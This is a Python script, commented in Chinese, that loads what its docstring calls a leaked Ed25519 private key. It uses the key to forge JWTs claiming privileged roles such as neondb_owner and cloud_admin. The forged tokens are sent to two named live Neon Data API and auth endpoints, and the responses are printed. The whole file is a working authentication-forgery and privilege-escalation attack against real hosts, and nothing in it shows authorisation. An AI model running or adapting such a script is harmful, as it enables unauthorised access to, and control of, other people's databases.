# -*- coding: utf-8 -*-
"""用泄露的 Ed25519 私钥签 JWT -> 打 Data API + neonauth 面"""
import json, time, base64, http.client, ssl
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization

ctx = ssl.create_default_context()

# 1) 解析私钥
raw = open(r'D:\scan\neon_report\_neonauth_priv.txt').read().strip()
try:
    raw = json.loads(raw)  # 可能是 JSON 字符串
except Exception:
    pass
print('priv raw len:', len(raw), flush=True)
if len(raw) == 128:  # 64B hex: 32B seed + 32B pub
    seed = bytes.fromhex(raw[:64])
else:
    seed = bytes.fromhex(raw)
print('seed len:', len(seed), flush=True)
priv = Ed25519PrivateKey.from_private_bytes(seed)
pub = priv.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
x = base64.urlsafe_b64encode(pub).rstrip(b'=').decode()
print('derived x:', x, flush=True)

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def make_jwt(payload, kid='6ab964bf-eee3-4249-bac3-85adf9d5faee'):
    header = {'alg': 'EdDSA', 'typ': 'JWT', 'kid': kid}
    h = b64u(json.dumps(header).encode())
    p = b64u(json.dumps(payload).encode())
    sig = priv.sign((h + '.' + p).encode())
    return h + '.' + p + '.' + b64u(sig)

DA = 'ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build'
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'

def https_get(host, path, auth=None):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=20)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
        if auth: h['Authorization'] = 'Bearer ' + auth
        conn.request('GET', path, headers=h)
        r = conn.getresponse(); raw = r.read()
        st = r.status; conn.close()
        return st, raw[:400]
    except Exception as e:
        return 0, str(e).encode()[:200]

now = int(time.time())
payloads = [
    ('role=neondb_owner', {'sub': 'sec-user-1', 'role': 'neondb_owner', 'iat': now, 'exp': now + 3600, 'iss': 'sec-test'}),
    ('role=authenticator', {'sub': 'sec-user-1', 'role': 'authenticator', 'iat': now, 'exp': now + 3600}),
    ('role=cloud_admin', {'sub': 'sec-user-1', 'role': 'cloud_admin', 'iat': now, 'exp': now + 3600}),
    ('role=anonymous', {'sub': 'sec-user-1', 'role': 'anonymous', 'iat': now, 'exp': now + 3600}),
]
for name, pl in payloads:
    tok = make_jwt(pl)
    st, raw = https_get(DA, '/neondb/rest/v1/', tok)
    print('\n[DA %s] -> %d | %s' % (name, st, raw.decode(errors='replace')[:250]), flush=True)
    st, raw = https_get(NA, '/neondb/auth/get-session', tok)
    print('[NA %s get-session] -> %d | %s' % (name, st, raw.decode(errors='replace')[:150]), flush=True)
    time.sleep(0.8)

# 不带 kid 变体
tok = make_jwt({'sub': 'x', 'role': 'neondb_owner', 'iat': now, 'exp': now + 3600}, kid='other-kid')
st, raw = https_get(DA, '/neondb/rest/v1/', tok)
print('\n[DA wrong-kid] -> %d | %s' % (st, raw.decode(errors='replace')[:250]), flush=True)
